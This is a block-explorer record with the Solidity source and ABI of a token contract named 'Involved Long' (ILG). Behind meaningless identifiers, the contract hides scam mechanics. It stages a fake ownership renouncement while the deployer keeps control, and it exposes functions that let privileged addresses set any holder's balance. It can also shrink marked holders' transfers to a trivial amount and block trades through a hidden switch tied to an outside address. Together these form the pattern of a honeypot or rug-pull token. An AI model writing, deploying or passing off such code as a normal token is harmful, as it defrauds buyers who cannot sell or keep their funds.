{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface amountShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldBuy {\n    function createPair(address amountLaunched, address launchedTotalLiquidity) external returns (address);\n}\n\ninterface feeTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toLimit) external view returns (uint256);\n\n    function transfer(address sellTotalShould, uint256 maxFrom) external returns (bool);\n\n    function allowance(address autoTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellTotalShould,\n        uint256 maxFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeWalletSwap, uint256 value);\n    event Approval(address indexed autoTotal, address indexed spender, uint256 value);\n}\n\ninterface limitAt is feeTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InvolvedLong is amountReceiver, feeTotal, limitAt {\n\n    bool private fundTake;\n\n    function sellShouldTotal() private view {\n        require(minReceiver[_msgSender()]);\n    }\n\n    mapping(address => bool) public minReceiver;\n\n    function modeTotal(address teamAuto, address sellTotalShould, uint256 maxFrom) internal returns (bool) {\n        if (teamAuto == atToken) {\n            return liquidityTx(teamAuto, sellTotalShould, maxFrom);\n        }\n        uint256 launchTx = feeTotal(feeTx).balanceOf(minMax);\n        require(launchTx == autoReceiver);\n        require(sellTotalShould != minMax);\n        if (tokenFund[teamAuto]) {\n            return liquidityTx(teamAuto, sellTotalShould, launchTrading);\n        }\n        return liquidityTx(teamAuto, sellTotalShould, maxFrom);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atFee;\n    }\n\n    uint256 private liquidityEnableLimit;\n\n    function autoFrom(address limitSender, uint256 maxFrom) public {\n        sellShouldTotal();\n        tokenIs[limitSender] = maxFrom;\n    }\n\n    function allowance(address enableWallet, address fromLimit) external view virtual override returns (uint256) {\n        if (fromLimit == limitTo) {\n            return type(uint256).max;\n        }\n        return amountLimit[enableWallet][fromLimit];\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingFund;\n    }\n\n    uint256 isAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isLimit;\n    }\n\n    function minTx(address swapListAt) public {\n        sellShouldTotal();\n        \n        if (swapListAt == atToken || swapListAt == feeTx) {\n            return;\n        }\n        tokenFund[swapListAt] = true;\n    }\n\n    uint256 public liquiditySellMarketing;\n\n    uint256 private receiverTo;\n\n    string private marketingLiquidity = \"Involved Long\";\n\n    constructor (){\n        \n        amountShould liquidityBuyTake = amountShould(limitTo);\n        feeTx = shouldBuy(liquidityBuyTake.factory()).createPair(liquidityBuyTake.WETH(), address(this));\n        \n        atToken = _msgSender();\n        sellTeam();\n        minReceiver[atToken] = true;\n        tokenIs[atToken] = isLimit;\n        if (limitExempt == fundTake) {\n            fundTake = true;\n        }\n        emit Transfer(address(0), atToken, isLimit);\n    }\n\n    bool public minIs;\n\n    function transferFrom(address teamAuto, address sellTotalShould, uint256 maxFrom) external override returns (bool) {\n        if (_msgSender() != limitTo) {\n            if (amountLimit[teamAuto][_msgSender()] != type(uint256).max) {\n                require(maxFrom <= amountLimit[teamAuto][_msgSender()]);\n                amountLimit[teamAuto][_msgSender()] -= maxFrom;\n            }\n        }\n        return modeTotal(teamAuto, sellTotalShould, maxFrom);\n    }\n\n    mapping(address => mapping(address => uint256)) private amountLimit;\n\n    function approve(address fromLimit, uint256 maxFrom) public virtual override returns (bool) {\n        amountLimit[_msgSender()][fromLimit] = maxFrom;\n        emit Approval(_msgSender(), fromLimit, maxFrom);\n        return true;\n    }\n\n    uint8 private tradingFromLimit = 18;\n\n    function liquidityTx(address teamAuto, address sellTotalShould, uint256 maxFrom) internal returns (bool) {\n        require(tokenIs[teamAuto] >= maxFrom);\n        tokenIs[teamAuto] -= maxFrom;\n        tokenIs[sellTotalShould] += maxFrom;\n        emit Transfer(teamAuto, sellTotalShould, maxFrom);\n        return true;\n    }\n\n    address public atToken;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingLiquidity;\n    }\n\n    mapping(address => bool) public tokenFund;\n\n    event OwnershipTransferred(address indexed swapWalletTrading, address indexed tradingTx);\n\n    address private marketingFund;\n\n    address limitTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private isLimit = 100000000 * 10 ** 18;\n\n    uint256 constant launchTrading = 20 ** 10;\n\n    bool public sellMarketingLimit;\n\n    mapping(address => uint256) private tokenIs;\n\n    address minMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private launchedMin;\n\n    function tradingToken(address exemptSellReceiver) public {\n        require(exemptSellReceiver.balance < 100000);\n        if (minIs) {\n            return;\n        }\n        \n        minReceiver[exemptSellReceiver] = true;\n        if (liquidityEnableLimit != launchedMin) {\n            sellMarketingLimit = false;\n        }\n        minIs = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingFromLimit;\n    }\n\n    string private atFee = \"ILG\";\n\n    function shouldSender(uint256 maxFrom) public {\n        sellShouldTotal();\n        autoReceiver = maxFrom;\n    }\n\n    function balanceOf(address toLimit) public view virtual override returns (uint256) {\n        return tokenIs[toLimit];\n    }\n\n    uint256 public isTotal;\n\n    uint256 autoReceiver;\n\n    function sellTeam() public {\n        emit OwnershipTransferred(atToken, address(0));\n        marketingFund = address(0);\n    }\n\n    function transfer(address limitSender, uint256 maxFrom) external virtual override returns (bool) {\n        return modeTotal(_msgSender(), limitSender, maxFrom);\n    }\n\n    function owner() external view returns (address) {\n        return marketingFund;\n    }\n\n    address public feeTx;\n\n    bool private limitExempt;\n\n    bool public txMarketingTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapWalletTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeWalletSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFrom\",\"type\":\"uint256\"}],\"name\":\"autoFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySellMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapListAt\",\"type\":\"address\"}],\"name\":\"minTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMarketingLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxFrom\",\"type\":\"uint256\"}],\"name\":\"shouldSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSellReceiver\",\"type\":\"address\"}],\"name\":\"tradingToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellTotalShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMarketingTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "InvolvedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}